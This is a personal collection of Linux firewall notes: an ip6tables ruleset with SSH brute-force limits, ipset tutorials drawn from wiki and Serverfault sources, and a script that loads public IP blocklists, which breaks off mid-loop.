#$IP6T -A STATEFUL -j DUMP

# Loopback rules
$IP6T -A INPUT -i lo -j ACCEPT
$IP6T -A INPUT -i !lo -d ::1 -j REJECT
$IP6T -A OUTPUT -o lo -j ACCEPT
$IP6T -A OUTPUT -o !lo -d ::1 -j REJECT

# Block
# Drop reserved addresses incoming (these are reserved addresses)
# but may change soon
#$IP6T -A INPUT -i eth0 -s ::1 -j DUMP

# Drop reserved addresses outgoing (these are reserved addresses)
# but may change soon
#$IP6T -A OUTPUT -o eth0 -d ::1 -j DUMP

# Allow certain inbound ICMP types (ping, traceroute..)
$IP6T -A INPUT -i eth0 -p icmp --icmp-type destination-unreachable -m limit --limit  1/s --limit-burst 1 -j ACCEPT
$IP6T -A INPUT -i eth0 -p icmp --icmp-type time-exceeded -m limit --limit  1/s --limit-burst 1 -j ACCEPT
$IP6T -A INPUT -i eth0 -p icmp --icmp-type echo-reply -m limit --limit  1/s --limit-burst 1 -j ACCEPT
$IP6T -A INPUT -i eth0 -p icmp --icmp-type echo-request -m limit --limit  1/s --limit-burst 1 -j ACCEPT
$IP6T -A INPUT -i eth0 -p icmp -m limit --limit 1/s --limit-burst 1 -j LOG --log-prefix "ip6tables: PING-DROP: "
$IP6T -A INPUT -i eth0 -p icmp -j DROP

# Drop all packets to port 111 except those from localhost
$IP6T -A INPUT ! -s ::1 -p tcp --dport 111 -j REJECT --reject-with tcp-reset

# kill off identd quick 
$IP6T -A INPUT -i eth0 -p tcp --dport 113 -j REJECT --reject-with tcp-reset

# Allow all established, related in
#$IP6T -A INPUT -i eth0 -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT

# Allows Inbound NEW DOS SSH Attack prevention (only 4 attempts by an IP every 3 minutes, drop the rest)
# The ACCEPT at the end is necessary or, it wouldn't accept any connection
$IP6T -A INPUT -i eth0 -p tcp -m tcp --dport $SSHPORT -m conntrack --ctstate NEW -m recent --set --name DEFAULT --rsource
$IP6T -A INPUT -i eth0 -p tcp -m tcp --dport $SSHPORT -m conntrack --ctstate NEW -m recent --update --seconds 180 --hitcount 4 --name DEFAULT --rsource -j LOG -m limit --limit 20/m --log-prefix "ip6tables: SSH Attempt on port $SSHPORT : "
$IP6T -A INPUT -i eth0 -p tcp -m tcp --dport $SSHPORT -m conntrack --ctstate NEW -m recent --update --seconds 180 --hitcount 4 --name DEFAULT --rsource -j REJECT
$IP6T -A INPUT -i eth0 -p tcp -m tcp --dport $SSHPORT -m conntrack --ctstate NEW -j ACCEPT

# Inbound ESTABLISHED SSH (out is in Multi-out)
$IP6T -A INPUT -i eth0 -p tcp --dport $SSHPORT -m conntrack --ctstate ESTABLISHED -j ACCEPT

# DOS HTTP Attack prevention
# For this, no one seems to be using IPv6 for legitimet browsing, so, I've been disabling it
#$IP6T -A INPUT -i eth0 -p tcp --dport 80 -m limit --limit 45/minute --limit-burst 300 -j ACCEPT
#$IP6T -A INPUT -i eth0 -p tcp --dport 80 -m hashlimit --hashlimit-upto 80/min --hashlimit-burst 800 --hashlimit-mode srcip --hashlimit-name http -j ACCEPT
$IP6T -A INPUT -i eth0 -p tcp --dport 80 -j DROP
#$IP6T -A INPUT -i eth0 -p tcp --dport 443 -m limit --limit 45/minute --limit-burst 300 -j ACCEPT
#$IP6T -A INPUT -i eth0 -p tcp --dport 443 -m hashlimit --hashlimit-upto 80/min --hashlimit-burst 800 --hashlimit-mode srcip --hashlimit-name https -j ACCEPT
$IP6T -A INPUT -i eth0 -p tcp --dport 443 -j DROP

# Allow Ping from Outside to Inside
$IP6T -A OUTPUT -p icmp --icmp-type echo-reply -j ACCEPT

# Multi-out for inbound SSH, HTTP, and HTTPS
$IP6T -A OUTPUT -o eth0 -p tcp -m multiport --sports $SSHPORT,80,443 -m conntrack --ctstate NEW,ESTABLISHED -j ACCEPT

# Outbound SSH
$IP6T -A INPUT -i eth0 -p tcp --sport $SSHPORT  -m conntrack --ctstate ESTABLISHED -j ACCEPT
$IP6T -A OUTPUT -o eth0 -p tcp --dport $SSHPORT  -m conntrack --ctstate NEW,ESTABLISHED -j ACCEPT

# Allow inbound DNS
#$IP6T -A INPUT -i eth0 -p udp --sport 1024:65535 --dport 53 -j ACCEPT
#$IP6T -A OUTPUT -p udp --sport 53 --dport 1024:65535 -j ACCEPT

# Allow outbound DNS
$IP6T -A INPUT -i eth0 -p udp --dport 1024:65535 --sport 53 -j ACCEPT
$IP6T -A OUTPUT -p udp --dport 53 --sport 1024:65535 -j ACCEPT

# Outbound HTTP, and HTTPS
$IP6T -A OUTPUT -o eth0 -p tcp --dport 80 --sport 1024:65535 -j ACCEPT
$IP6T -A INPUT -i eth0 -p tcp --dport 1024:65535 --sport 80 -j ACCEPT
$IP6T -A OUTPUT -o eth0 -p tcp --dport 443 --sport 1024:65535 -j ACCEPT
$IP6T -A INPUT -i eth0 -p tcp --dport 1024:65535 --sport 443 -j ACCEPT

# Inbound SMTP
#$IP6T -A INPUT -i eth0 -p tcp --sport 1024:65535 --dport 25 -m conntrack --ctstate NEW,ESTABLISHED -j ACCEPT
#$IP6T -A OUPUT -o eth0 -p tcp --sport 25 --dport 1024:65535 -m conntrack --ctstate NEW,ESTABLISHED -j ACCEPT

# Outbound SMTP
#$IP6T -A INPUT -i eth0 -p tcp --sport 25 --dport 1024:65535 -m conntrack --ctstate NEW,ESTABLISHED -j ACCEPT
#$IP6T -A OUTPUT -o eth0 -p tcp --sport 1024:65535 --dport 25 -m conntrack --ctstate NEW,ESTABLISHED -j ACCEPT

# Allow rsync from a specific network
#$IP6T -A INPUT -i eth0 -p tcp -s 192.168.101.0/24 --dport 873 -m conntrack --ctstate NEW,ESTABLISHED -j ACCEPT
#$IP6T -A OUTPUT -o eth0 -p tcp --sport 873 -m conntrack --ctstate ESTABLISHED -j ACCEPT

# Allow SVN
#$IP6T -A INPUT -i eth0 -p tcp --dport 3690 --sport 1024:65535 -j ACCEPT
#$IP6T -A OUTPUT -o eth0 -p tcp --sport 3690 --dport 1024:65535 -j ACCEPT
#$IP6T -A INPUT -i eth0 -p tcp --dport 3667 --sport 1024:65535 -j ACCEPT
#$IP6T -A OUTPUT -o eth0 -p tcp --sport 3667 --dport 1024:65535 -j ACCEPT

# Allow all related
#$IP6T -A OUTPUT -o eth0 -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT

# Don't log route packets coming from routers - too much logging
$IP6T -A INPUT -i eth0 -p udp --dport 520 -j REJECT

# Don't log smb/windows sharing packets - too much logging
$IP6T -A INPUT -i eth0 -p tcp --dport 137:139 -j REJECT
$IP6T -A INPUT -i eth0 -p udp --dport 137:139 -j REJECT

# All policies set to DROP
$IP6T --policy INPUT DROP
$IP6T --policy OUTPUT DROP
$IP6T --policy FORWARD DROP
#$IP6T --policy ADMIN_IP DROP


# You will need to #

sudo chmod +x $filename

and then

sudo ./$filename


# to install the IPTables configuration. It may show a few errors, and if it shows many and/or you #

sudo iptables -L -v -n --line-numbers

and there aren’t any results, you may need greater access to your kernel. I had to upgrade to a more “real” host from my provider to be able to enable the LOG options among others.
Blocklist Automatic Update


# This ruleset uses ipset, and you will need to install it to use it. #

sudo apt-get install ipset


# You will need to make the list now, here is how that works: (thank you: http://adityamukho.com) #

sudo ipset create blacklist hash:ip hashsize 4096 maxelem 1048576


# Here is the script that you can put in a cron folder or add to your crontab to auto grab a blacklist/blocklist/shunlist and import it into your list. It is important like all things in your /etc folder, you #

sudo chown root:root $filename

and to make it executable

sudo chmod +x $filename



File: makeblocklist.sh 

#!/bin/bash
# Jim McKibben
# AutoShun.org IPTables Blocklist Importer

wget -O /tmp/shunlist.csv http://autoshun.org/files/shunlist.csv

cat /tmp/shunlist.csv | egrep -o '^([0-9]{1,3}\.){3}[0-9]{1,3}' > /tmp/blocklist.txt
while read IP; do
	sudo ipset add blacklist $IP
done < /tmp/blocklist.txt

Credit for this next section goes directly to Ubuntu at https://help.ubuntu.com/community/IptablesHowTo, well done guys! I should mention that I have modified this a bit to allow for ipset lists and in that, you will have to install ipset to use them as already mentioned above.
Configuration on startup and shutdown

(keep your lists/config!)

WARNING: Iptables and NetworkManager can conflict. Also if you are concerned enough about security to install a firewall you might not want to trust NetworkManager. Also note NetworkManager and iptables have opposite aims. Iptables aims to keep any questionable network traffic out. NetworkManager aims to keep you connected at all times. Therefore if you want security all the time, run iptables at boot time. If you want security some of the time then NetworkManager might be the right choice.

WARNING: If you use NetworkManager (installed by default on Feisty and later) these steps will leave you unable to use NetworkManager for the interfaces you modify. Please follow the steps in the next section instead.

NOTE: It appears on Hardy, NetworkManager has an issue with properly on saving and restoring the iptable rules when using the method in the next section. Using this first method appears to work. If you find otherwise, please update this note.
Save your firewall rules to a file


sudo sh -c "iptables-save > /etc/iptables.rules"


At this point you have several options. You can make changes to /etc/network/interfaces or add scripts to /etc/network/if-pre-up.d/ and /etc/network/if-post-down.d/ to achieve similar ends. The script solution allows for slightly more flexibility.

NOTE: This solution uses iptables-save -c to save the counters. Just remove the -c to only save the rules.
Alternatively you could add the iptables-restore and iptables-save to the if-pre-up.d and if-post-down.d directories in the /etc/network directory instead of modifying /etc/network/interface directly.


The script /etc/network/if-pre-up.d/iptablesload will contain:

#!/bin/sh
# ipset load happens first
ipset load < /etc/ipset/ipset.blacklist.list

# then we can load the iptables rules
iptables-restore < /etc/iptables.rules

exit 0


and /etc/network/if-post-down.d/iptablessave will contain:

#!/bin/sh

# ipset save happens first
ipset save blacklist > /etc/ipset/ipset.blacklist.list

# iptables save happens next
iptables-save -c > /etc/iptables.rules
if[ -f /etc/iptables.downrules ]; then
	iptables-restore < /etc/iptables.downrules
fi
exit 0


Then be sure to give both scripts execute permissions:

sudo chmod +x /etc/network/if-post-down.d/iptablessave

sudo chmod +x /etc/network/if-pre-up.d/iptablesload

Now you've got a firewall that stays over reboot, and is strongly configured! Please comment and let me know how it works for you. I'm particualarly interested if you changed anything to improve functionality of existing services levels, added any well typed/complete protocol/service listings, and/or hardened it any further.
This guide is offered for free, but if you require assistance, I'd be happy to do so but will require a reasonable donation (see above in the About section).


#### Arch wiki

# Resetting rules: You can flush and reset iptables to default using these commands

iptables -F
iptables -X
iptables -t nat -F
iptables -t nat -X
iptables -t mangle -F
iptables -t mangle -X
iptables -t raw -F
iptables -t raw -X
iptables -t security -F
iptables -t security -X
iptables -P INPUT ACCEPT
iptables -P FORWARD ACCEPT
iptables -P OUTPUT ACCEPT


# Allow github
sudo iptables -A OUTPUT -o eth0 -p tcp --dport 9418 -m conntrack --ctstate NEW,ESTABLISHED -j ACCEPT
sudo iptables -A INPUT -i eth0 -p tcp --sport 9418 -m conntrack --ctstate ESTABLISHED -j ACCEPT

#############################################################################################################################################################################################

############################################################################################ ipset ##########################################################################################

#### ipset

## Add/restore IPs from a file
for ip in `cat /home/chuck/vps/ipset-blacklist/blacklist.list`; do sudo ipset add blacklist $ip;done

# ipset's hashsize and maxelem parameters
When defining a Linux hash ipset the parameters hashsize and maxelem must be chosen.

maxelem is easy: this limits how many entries the ipset can have.

hashsize however is a tuning parameter. It defines how many hash buckets are allocated for the hashtable. This is the amount of memory that you are willing to sacrifice. It has a very coarse granularity and accepts only values that are equal to 2^n where n is 
1..32.

Hashtables are most efficient (buckets mostly contain only a single key, eliminating the search within a bucket) when only 3/4 of their buckets are actually used (1/4 is free). But for large ipsets this is not practical as it would waste a lot of memory. For 
example for an ipset with 100'000 entries the hashsize should be at least 133'333. The next larger legal value of hashsize is 262'144 which is very wasteful (but fast).

So for such large hashtables we can't really afford to avoid the bucket search. Instead we try to find a balance between the size of a bucket and the number of buckets. If we put 8 entries inside a bucket on average then we get 12'500 buckets. The next legal value 
for hashsize is 16'384, which gets us 6 entries in average in reality. This should yield acceptable performance vs. small enough space.

# IP sets revisited Serverfault

There is already an answer mentioning IP sets. However, it's rather one-dimensional in that it focuses on the performance gains over classic rules and the fact that IP sets mitigate the problem one has with lots of individual IP address that cannot easily be expressed as a 
subnet in CIDR notation. Notation used below

For ipset I will use the notation read by ipset restore and written by ipset save.

Correspondingly for iptables (and ip6tables) rules I will use the notation as read by iptables-restore and written by iptables-save. This makes for a shorter notation and it allows me to highlight potential IPv4-only (prefixed -4) or IPv6-only (prefixed -6) rules.

In some examples we'll divert the packet flow into another chain. The chain is assumed to exist at that point, so the lines to create the chains are not produced (nor is the table name mentioned or the commands COMMIT-ted at the end).
Advanced IP sets

IP sets can do a lot more than was mentioned in the other answer and you should definitely read the IP set documentation (ipset(8)) along with iptables-extensions(8) in addition to this brief entry here.

For example I'll mainly focus on three set types: hash:ip, hash:net and list:set, but there are more than those and they all have valid use cases.

You can for example also match port numbers, not just IP addresses.
Saving and restoring IP sets as with iptables-save and iptables-restore

You can create IP set declarations in bulk and import them by piping them into ipset restore. If you want to make your command more resilient against already existing entries, use ipset -exist restore.

If your rules are in a file called default.set you'd use:

ipset -exist restore < default.set

A file like that can contain entries to create sets and to add entries into them. But generally most of the commands from the command line seem to have a corresponding version in the files. Example (creating a set of DNS servers):

create dns4 hash:ip family inet
create dns6 hash:ip family inet6
# Google DNS servers
add dns4 8.8.8.8
add dns4 8.8.4.4
add dns6 2001:4860:4860::8888
add dns6 2001:4860:4860::8844

Here one set is created for IPv4 (dns4) and one for IPv6 (dns6).
Timeouts on IP sets

Timeouts in IP sets can be set as a default per set and also per entry. This is very useful for scenarios where you want to block someone temporarily (e.g. for port-scanning or attempting to brute-force your SSH server).

The way this works is as follows (default during creation of IP sets):

create ssh_loggedon4 hash:ip  family inet  timeout 5400
create ssh_loggedon6 hash:ip  family inet6 timeout 5400
create ssh_dynblock4 hash:ip  family inet  timeout 1800
create ssh_dynblock6 hash:ip  family inet6 timeout 1800

We'll get back to these particular sets below and the rationale as to why they're set the way they are.

If you wanted to set your timeout for a particular IP address, you could simply say:

add ssh_dynblock4 1.2.3.4 timeout 7200

To block IP 1.2.3.4 for two hours instead of the (set) default half hour.

If you were to look at that with ipset save ssh_dynblock4 after a short while, you'd see something along the lines of:

create ssh_dynblock4 hash:ip family inet hashsize 1024 maxelem 65536 timeout 1800
add ssh_dynblock4 1.2.3.4 timeout 6954

Timeout caveats

    timeouts are a feature on any given set. If the set was not created with timeout support you'll receive an error (e.g. Kernel error received: Unknown error -1).
    timeouts are given in seconds. Use Bash arithmetic expressions to get from minutes to seconds, for example. E.g.: sudo ipset add ssh_dynblock4 1.2.3.4 timeout $((120*60))

Checking whether an entry exists in a given IP set

Inside of your scripts it can be useful to see whether an entry already exists. This can be achieved with ipset test which returns zero if the entry exists and non-zero otherwise. So the usual checks can be applied in a script:

if ipset test dns4 8.8.8.8; then
  echo "Google DNS is in the set"
fi

However, in many cases you'll rather want to use the -exist switch to ipset in order to direct it not to complain about existing entries.
Populating IP sets from iptables rules

This, in my opinion, is one of the killer features of IP sets. Not only can you match against the entries of an IP set, you can also add new entries to an existing IP set.

For example in this answer to this question you have:

-A INPUT -p tcp -i eth0 -m state --state NEW --dport 22 -m recent --update --seconds 15 -j DROP
-A INPUT -p tcp -i eth0 -m state --state NEW --dport 22 -m recent --set -j ACCEPT

... with the intention to rate-limit connection attempts to SSH (TCP port 22). The used module recent keeps track of recent connection attempts. Instead of the state module, I prefer the conntrack module, however.

# Say on your input chain of the filter table you have
   -A INPUT -i eth+ -p tcp --dport ssh -j SSH
# Then inside the SSH chain you can
# 1. create an entry in the recent list on new connections
   -A SSH -m conntrack --ctstate NEW -m recent --set --name tarpit
# 2. check whether 3 connection attempts were made within 2 minutes
#    and if so add or update an entry in the ssh_dynblock4 IP set
-4 -A SSH -m conntrack --ctstate NEW -m recent --rcheck --seconds 120 --hitcount 3 --name tarpit -j SET --add-set ssh_dynblock4 src --exist
-6 -A SSH -m conntrack --ctstate NEW -m recent --rcheck --seconds 120 --hitcount 3 --name tarpit -j SET --add-set ssh_dynblock6 src --exist
# 3. last but not least reject the packets if the source IP is in our
#    IP set
-4 -A SSH -m set --match-set ssh_dynblock4 src -j REJECT
-6 -A SSH -m set --match-set ssh_dynblock6 src -j REJECT

In this case I am redirecting the flow to the SSH chain such that I don't have to repeat myself with -p tcp --dport ssh for every single rule.

To reiterate:

    -m set makes iptables aware that we're using switches from the set module (which handles IP sets)
    --match-set ssh_dynblock4 src tells iptables to match the source (src) address against the named set (ssh_dynblock4)
        this corresponds to sudo ipset test ssh_dynblock4 $IP (where $IP contains the source IP address for the packet)
    -j SET --add-set ssh_dynblock4 src --exist adds or updates the source (src) address from the packet into the IP set ssh_dynblock4. If an entry exists (--exist) it will simply be updated.
        this corresponds to sudo ipset -exist add ssh_dynblock4 $IP (where $IP contains the source IP address for the packet)

If you wanted to match the target/destination address instead, you'd use dst instead of src. Consult the manual for more options.
Sets of sets

IP sets can contain other sets. Now if you followed the article up to here you'll have wondered whether it's possible to combine sets. And of course it is. For the IP sets from above we can create two joint sets ssh_dynblock and ssh_loggedon respectively to contain the IPv4-only and IPv6-only sets:

create ssh_loggedon4 hash:ip  family inet  timeout 5400
create ssh_loggedon6 hash:ip  family inet6 timeout 5400
create ssh_dynblock4 hash:ip  family inet  timeout 1800
create ssh_dynblock6 hash:ip  family inet6 timeout 1800
# Sets of sets
create ssh_loggedon  list:set
create ssh_dynblock  list:set
# Populate the sets of sets
add ssh_loggedon ssh_loggedon4
add ssh_loggedon ssh_loggedon6
add ssh_dynblock ssh_dynblock4
add ssh_dynblock ssh_dynblock6

And the next question that should pop up in your mind is whether this allows us to match and and manipulate IP sets in an IP version-agnostic fashion.

And the answer to that is a resounding: YES! (alas, this wasn't documented explicitly last time I checked)

Consequently the rules from the previous section can be rewritten to read:

-A INPUT -i eth+ -p tcp --dport ssh -j SSH
-A SSH -m conntrack --ctstate NEW -m recent --set --name tarpit
-A SSH -m conntrack --ctstate NEW -m recent --rcheck --seconds 120 --hitcount 3 --name tarpit -j SET --add-set ssh_dynblock src --exist
-A SSH -m set --match-set ssh_dynblock src -j REJECT

which is a lot more concise. And yes, this is tried and tested and works like a charm.
Putting it all together: SSH brute-force defense

On my servers I have a script run as a cron job which takes a bunch of host names and resolves those to IP addresses, then feeding it into the IP set for "trusted hosts". The idea is that trusted hosts get more attempts to log into the server and aren't necessarily blocked out for as long as anybody else.

Conversely I have whole countries blocked out from connecting to my SSH server, with the (potential) exception of trusted hosts (i.e. order of rules matters).

However, that is left as an exercise for the reader. Here I'd like to add a neat solution that will use the sets contained in the ssh_loggedon set to allow subsequent connection attempts to be handed through and not be subject to the same scrutiny as the other packets.

It is important to remember the default timeouts of 90 minutes for ssh_loggedon and 30 minutes for ssh_dynblock when looking at the following iptables rules:

-A INPUT -i eth+ -p tcp --dport ssh -j SSH
-A SSH -m set --match-set ssh_loggedon src -j ACCEPT
-A SSH -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT
-A SSH -m conntrack --ctstate NEW -m recent --set --name tarpit
-A SSH -m conntrack --ctstate NEW -m recent --rcheck --seconds 120 --hitcount 3 --name tarpit -j SET --add-set ssh_dynblock src --exist
-A SSH -m set --match-set ssh_dynblock src -j REJECT

By now you should ask yourself how the connecting IP address ends up in the ssh_loggedon sub-sets. So read on ...
Bonus: adding the IP you log in with during SSH logon

If you have experimented with sshrc and friends, you'll have learned of its shortcomings. But PAM comes to the rescue. A module named pam_exec.so allows us to invoke a script during SSH logon at a point where we know that the user is admitted in.

In /etc/pam.d/sshd below the pam_env and pam_selinux entries add the following line:

session    optional     pam_exec.so stdout /path/to/your/script

and make sure that your version of the script (/path/to/your/script above) exists and is executable.

PAM uses environment variables to communicate what's going on, so you can use a simple script like this one:

#!/bin/bash
# When called via pam_exec.so ...
SETNAME=ssh_loggedon
if [[ "$PAM_TYPE" == "open_session" ]] && [[ -n "$PAM_RHOST" ]]; then
    [[ "x$PAM_RHOST" != "x${PAM_RHOST//:/}" ]] && SETNAME="${SETNAME}6" || SETNAME="${SETNAME}4"
    ipset -exist add $SETNAME "$PAM_RHOST"
fi

Unfortunately the ipset utility doesn't seem to have the built-in smarts of netfilter. So we need to distinguish between IPv4 and IPv6 IP set when adding our entry. Otherwise ipset will assume we want to add another set to the set of sets, instead of the IP. And of course it's unlikely that there would be a set named after an IP :)

So we check for : in the IP address and append 6 to the set name in such case and 4 otherwise.

The end.


# Limiting all individual IP addresses to an outbound bandwidth quota with IP Sets
# You may please to configure your server to only allow each individual IP 15GiByte of bandwidth usage per month, in hopes to reflect or dodge a bandwidth usage attack, perhaps for your metered bandwidth quota at your ISP. It can be accomplished as the following:
# First create the IP sets for IPv4 and IPv6:

ipset create IP_QUOTA_SET_OUT hash:ip timeout 345600 counters
ipset create IP_QUOTA_SET_OUT_INET6 hash:ip timeout 345600 counters family inet6

# Now add your iptables rules. The first line will add the IP to the set if it is not already there. The second line will not match if the bytes transferred for the IP in the set is greater than the amount specified. Then the same is done alike for IPv6.

iptables -I OUTPUT -m set ! --match-set IP_QUOTA_SET_OUT dst -j SET --add-set IP_QUOTA_SET_OUT dst --timeout 345600
iptables -I OUTPUT -m set --match-set IP_QUOTA_SET_OUT dst --bytes-gt 16106127360 -j DROP

ip6tables -I OUTPUT -m set ! --match-set IP_QUOTA_SET_OUT_INET6 src -j SET --add-set IP_QUOTA_SET_OUT_INET6 src --timeout 345600
ip6tables -I OUTPUT -m set --match-set IP_QUOTA_SET_OUT_INET6 src --bytes-gt 16106127360 -j DROP

# This will prevent attacks such as a user requesting a large file from your webserver for a long period of time, or from any service for that matter. The same can be done for the INPUT chain.

# Create a ip set

ipset4 create dnsbl hash:ip timeout $[86400 * 7] maxelem 500000 prevent_reset_on_restart comment


sudo nano /etc/ipset-blacklist/tcpbadbois.restore

create tcpbadbois hash:net family inet hashsize 1024 maxelem 500000 timeout 86400

sudo nano /etc/ipset-blacklist/udpbadbois.restore

create udpbadbois hash:net family inet hashsize 1024 maxelem 500000 timeout 86400


#### ipset is usfull to block unwanted IP addresses on Linux efficiently

You may want to block IP addresses on your Linux box under various circumstances. For example, as an end user you may want to protect yourself from known spyware or tracker IP addresses. Or when you are running P2P software, you may want to filter out connections from networks associated with anti-P2P activity. If you are a sysadmin, you may want to ban access from spam IP addresses to your production mail server. Or you may wish to block web server access from certain countries for some reason. In many cases, however, your IP address block list can grow quickly to tens of thousands of IP addresses or IP address blocks. How can you deal with it?

Problems of Netfilter/IPtables

In Linux, banning an IP address can be done very easily with netfilter/iptables framework:
$ sudo iptables -A INPUT -s 1.1.1.1 -p TCP -j DROP

If you want to ban a whole IP address block, you can also do it as easily:
$ sudo iptables -A INPUT -s 1.1.2.0/24 -p TCP -j DROP

However, what if you have 1,000 independent IP addresses with no common CIDR prefix that you want to ban? You would have 1,000 iptables rules! Clearly this does not scale.
$ sudo iptables -A INPUT -s 1.1.1.1 -p TCP -j DROP
$ sudo iptables -A INPUT -s 2.2.2.2 -p TCP -j DROP
$ sudo iptables -A INPUT -s 3.3.3.3 -p TCP -j DROP
. . . .

# What are IP Sets? #

That is when IP sets come in handy. IP sets are a kernel feature which allows multiple (independent) IP addresses, MAC addresses or even port numbers to be encoded and stored efficiently within bitmap/hash kernel data structures. Once an IP set is created, you can create an iptables rule which matches against the set.

You should immediately see the benefit of using IP sets, which is that you can match against multiple IP addresses in an IP set by using a single iptables rule! You can construct IP sets using combinations of multiple IP addresses and port numbers, and can dynamically update iptables rules with IP sets without any performance impact.

# Install IPset Tool on Linux #

To create and manage IP sets, you need to use a userspace tool called ipset.

To install ipset on Debian, Ubuntu or Linux Mint:
$ sudo apt-get install ipset

To install ipset on Fedora or CentOS/RHEL 7:
$ sudo yum install ipset


# Ban IP Addresses using IPset Command #

Let me walk you through on how to use ipset command using simple examples.

First, let's create a new IP set named banthis (name can be arbitrary):
$ sudo ipset create banthis hash:net

The second argument (hash:net) in the above is required, and represents the type of a set being created. There are multiple types of IP sets. An IP set of hash:net type uses a hash to store multiple CIDR blocks. If you want to store individual IP addresses in a set, you can use hash:ip type instead.

Once you have created an IP set, you can check up on the set with:
$ sudo ipset list

This shows a list of available IP sets, along with detailed information of each set including set membership. By default, each IP set can contain up to 65536 elements (CIDR blocks in this case). You can increase this limit by appending "maxelem N" option.
$ sudo ipset create banthis hash:net maxelem 1000000

Now let's add IP address blocks to the set:
$ sudo ipset add banthis 1.1.1.1/32
$ sudo ipset add banthis 1.1.2.0/24
$ sudo ipset add banthis 1.1.3.0/24
$ sudo ipset add banthis 1.1.4.10/24

You will see that the set membership has been changed.
$ sudo ipset list

Now it is time to create an iptables rule using this IP set. The key here is to use "-m set --match-set <name>" option.

Let's create an iptables rule which prevents all those IP blocks in the set from accessing a web server at port 80. This can be achieved by:
$ sudo iptables -I INPUT -m set --match-set banthis src -p tcp --destination-port 80 -j DROP

If you want, you can save a specific IP set to a file, and then later restore it from the file:
$ sudo ipset save banthis -f banthis.txt
$ sudo ipset destroy banthis
$ sudo ipset restore -f banthis.txt

In the above, I tried removing an existing IP set using destroy option to see if I can restore the IP set.
Automate IP Address Banning

By now you should see how powerful the concept of IP sets is. Still maintaining a up-to-date IP blacklist can be a cumbersome and time-consuming process. In fact, there are free or paid services out there which maintain these IP blacklists for you. As a bonus, let's see how we can automatically translate available IP blacklists into IP sets.

Let me grab free IP lists from iblocklist.com which publish various IP block lists for free or for a fee. Free versions are available in P2P format.

Here I am going to use an open-source python tool called iblocklist2ipset which converts P2P versions of iblocklist into IP sets.

First, you need to have pip installed (see this guideline to install pip).

Then install iblocklist2ipset as follows.
$ sudo pip install iblocklist2ipset

On some distros like Fedora, you may need to run:
$ sudo python-pip install iblocklist2ipset

Now go to iblocklist.com, and grab any P2P list URL (e.g., "level1" list).

Then paste the URL into the following command.
$ iblocklist2ipset generate \
--ipset banthis "http://list.iblocklist.com/?list=ydxerpxkpcfqjaybcssw&fileformat=p2p&archiveformat=gz" \
> banthis.txt

After you run the above command, you will get a file named bandthis.txt created. If you check its content, you will see something like:

create banthis hash:net family inet hashsize 131072 maxelem 237302
add banthis 1.2.4.0/24
add banthis 1.2.8.0/24
add banthis 1.9.75.8/32
add banthis 1.9.96.105/32
add banthis 1.9.102.251/32
add banthis 1.9.189.65/32
add banthis 1.16.0.0/14

You can simply load this file with ipset command:
$ sudo ipset restore -f banthis.txt

Now check the automatically created IP set with:
$ sudo ipset list banthis

As of this writing, the "level1" block list contains more than 237,000 IP address blocks. You will see that that many IP address blocks have been added to the IP set.

Finally, go ahead and create a single iptables rule to block them all!
Summary

In this tutorial, I demonstrated how you can block unwanted IP addresses using a powerful tool called ipset. Combine that with a third-party tool like iblocklist2ipset, and you can easily streamline the process of maintaining your IP block list. For those of you who are curious about the speed improvement of ipset, the figure below shows the benchmark result comparing iptables without and with ipset (credit to daemonkeeper.net).


#### Terminal28

Iptables – Blacklist IPs – linux.

Tested:

    Debian 7.8
    iptables v1.4.14

 
Install IPset.

sudo apt-get install ipset

sudo ipset create blacklist hash:net

 
Create auto-update script of ips database.

Download script for Debian/Ubuntu:

sudo wget "terminal28.com/wp-content/uploads/2015/04/update-blacklist.sh" -O /usr/local/bin/update-blacklist.sh

Script for other linux systems.

sudo nano /usr/local/bin/update-blacklist.sh

#!/bin/bash
IP_BLACKLIST_DIR=/etc/ipset-blacklist
IPSET_BLACKLIST_NAME=blacklist # change it if it collides with a pre-existing ipset list
IPSET_TMP_BLACKLIST_NAME=${IPSET_BLACKLIST_NAME}-tmp
IP_BLACKLIST_RESTORE=${IP_BLACKLIST_DIR}/ip-blacklist.restore
IP_BLACKLIST=${IP_BLACKLIST_DIR}/ip-blacklist.list
IP_BLACKLIST_CUSTOM=${IP_BLACKLIST_DIR}/ip-blacklist-custom.list # optional, for your personal nemeses (no typo, plural)
HASHSIZE=65536 # the initial hash size for the set. Don't touch unless you know what you're doing.
MAXELEM=65536 # the maximal number of elements which can be stored in the set

# List of URLs for IP blacklists. Currently, only IPv4 is supported in this script, everything else will be filtered.
BLACKLISTS=(
"http://www.projecthoneypot.org/list_of_ips.php?t=d&rss=1" # Project Honey Pot Directory of Dictionary Attacker IPs
"http://check.torproject.org/cgi-bin/TorBulkExitList.py?ip=1.1.1.1"  # TOR Exit Nodes
"https://www.maxmind.com/en/anonymous-proxy-fraudulent-ip-address-list" # MaxMind GeoIP Anonymous Proxies
"http://danger.rulez.sk/projects/bruteforceblocker/blist.php" # BruteForceBlocker IP List
"http://www.spamhaus.org/drop/drop.lasso" # Spamhaus Don't Route Or Peer List (DROP)
"http://cinsscore.com/list/ci-badguys.txt" # C.I. Army Malicious IP List
"http://www.openbl.org/lists/base.txt"  # OpenBL.org 30 day List
"http://www.autoshun.org/files/shunlist.csv" # Autoshun Shun List
"http://lists.blocklist.de/lists/all.txt" # blocklist.de attackers
"http://www.stopforumspam.com/downloads/toxic_ip_cidr.txt" # StopForumSpam
)

for command in ipset iptables egrep grep curl sort uniq wc
do
    if ! which $command > /dev/null; then
        echo "Error: please install $command"
        exit 1
    fi
done

if [ ! -d $IP_BLACKLIST_DIR ]; then
    echo "Error: please create $IP_BLACKLIST_DIR directory"
    exit 1
fi

if [ -f /etc/ip-blacklist.conf ]; then
    echo "Error: please remove /etc/ip-blacklist.conf"
    exit 1
fi

if [ -f /etc/ip-blacklist-custom.conf ]; then
    echo "Error: please move /etc/ip-blacklist-custom.conf to the $IP_BLACKLIST_DIR directory and rename it to $IP_BLACKLIST_CUSTOM"
    exit 1
fi

IP_BLACKLIST_TMP=$(mktemp)
for i in "${BLACKLISTS[@]}"
do
    IP_TMP=$(mktemp)
    HTTP_RC=`curl --connect-timeout 10 --max-time 10 -o $IP_TMP -s -w "%{http_code}" "$i"`
    if [ $HTTP_RC -eq 200 -o $HTTP_RC -eq 302 ]; then
        grep -Po '(?:\d{1,3}\.){3}\d{1,3}(?:/\d{1,2})?' $IP_TMP >> $IP_BLACKLIST_TMP
	echo -n "."
    else
